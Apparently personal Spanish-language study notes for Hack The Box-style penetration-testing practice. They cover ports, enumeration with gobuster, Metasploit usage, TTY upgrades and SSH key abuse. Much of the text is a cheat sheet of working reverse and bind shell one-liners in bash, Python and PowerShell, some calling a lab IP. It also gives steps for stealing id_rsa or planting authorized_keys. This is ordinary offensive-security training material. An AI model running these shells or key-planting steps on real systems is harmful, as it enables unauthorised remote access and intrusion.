
**CIA TRIAD** --> confidentiality, integrity, and availability of data

**Risk management process**:

| Step                    | Explanation                                                                                                                               |
| ----------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `Identificar el riesgo` | Identificar los riesgos a los que está expuesto el negocio: legal, environmental, de mercado, regulatorio etc.                            |
| `Analizarlo`            | Analizar para saber impacto y probabilidad. Los riesgos tendrán que ser mapeados a las políticas, procedimientos, y procesos del negocio. |
| `Evaluarlo`             | Evaluar, rankear y priorizar riesgos. Se tiene que elegir aceptar, evitar, mitigar, o delegar.                                            |
| `Tratarlo`              | Eliminar o contener. Esto incluye interferir con todo lo que pueda suponer cualquier riesgo                                               |
| `Monitorizarlo`         | Todos los riesgos tienen que estar continuamente monitorizados, y rankeados según el daño que puedan causar.                              |

**Puertos**

| Puerto (Protocolo) | Servicio              |
| ------------------ | --------------------- |
| `20`/`21` (TCP)    | `FTP`                 |
| `22` (TCP)         | `SSH`                 |
| `23` (TCP)         | `Telnet`              |
| `25` (TCP)         | `SMTP`                |
| `80` (TCP)         | `HTTP`                |
| `88 (TCP)`         | `Kerberos`            |
| `161` (TCP/UDP)    | `SNMP`                |
| `389` (TCP/UDP)    | `LDAP`                |
| `443` (TCP)        | `SSL`/`TLS` (`HTTPS`) |
| `445` (TCP)        | `SMB`                 |
| `3389` (TCP)       | `RDP`                 |

https://nullsec.us/top-1-000-tcp-and-udp-ports-nmap-default/

**VIM**

|Command|Description|
|---|---|
|`x`|Cut character|
|`dw`|Cut word|
|`dd`|Cut full line|
|`yw`|Copy word|
|`yy`|Copy full line|
|`p`|Paste|

En FTP: cd, ls, get

SMB:
smbclient -N (no pedir contraseña) -L listar shares -U (user) ||| get 


**Enumeration con gobuster**

banner --> nc -nv ip port
```shell
gobuster dir -u http://10.10.10.121/ -w diccionario
```
Para directorios, podemos usar
```shell
gobuster dns -d dominio.com -w diccionario
```

El robots.txt puede dar información valiosa. Se ve el source con ctrl+u

Para encontrar exploits, se puede usar searchsploit (exploit-db), o 'search exploit' en msf
Para seleccionar el exploit en msf, 'use nombre_exploit'
Para ver las opciones en el exploit, 'show options'
Para configurarlo, 'set OPCION param'
RHOST = Target
LHOST = Attacker/Interfaz de red

Con todo configurado, se puede usar 'check' para comprobar que la víctima es vulnerable, y, para usar el exploit, 'run' | 'exploit'

## Shells
### Rev Shell
listener: nc -lvnp 1234
victim: 
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
``````

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```


### Bind Shell
Estas shells se quedan esperando a que nos conectemos, o sea ellos son los listeners

victim:
https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```
```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

attacker: 
```shell
nc 10.10.10.1 1234
```


### Tratamiento de la TTY
```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

ctrl+z para el background, 
```shell
stty raw -echo
fg
```

Luego tenemos que pasarle nuestro $TERM con 'export TERM'
	y nuestro tamaño (stty size) con 'stty rows num columns num'



## SSH KEYS
Si se consigue entrar a /home/user/.ssh
o /root/.ssh,
se puede descargar el id_rsa, y usarlo para acceder por shh
'ssh root@ip -i id_rsa'


Si no, se puede ir a /.ssh/authorized_keys,
y tras en nuestra máquina haber generado el par (ssh-keygen -f key), subr el .pub a ese directorio, y loguearnos con 'ssh user@ip -i key'
## Privesc
https://book.hacktricks.wiki/en/index.html
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite



- [ ]  Root a Retired Easy Box  
    
- [ ]  Root a Retired Medium Box  
    
- [ ]  Root an Active Box  
    
- [ ]  Complete an Easy Challenge  
    
- [ ]  Share a Walkthrough of a Retired Box  
    
- [ ]  Complete Offensive Academy Modules  
    
- [ ]  Root Live Medium/Hard Boxes  
    
- [ ]  Complete A Track  
    
- [ ]  Win a `Hack The Box Battlegrounds` Battle  
    
- [ ]  Complete A Pro Lab


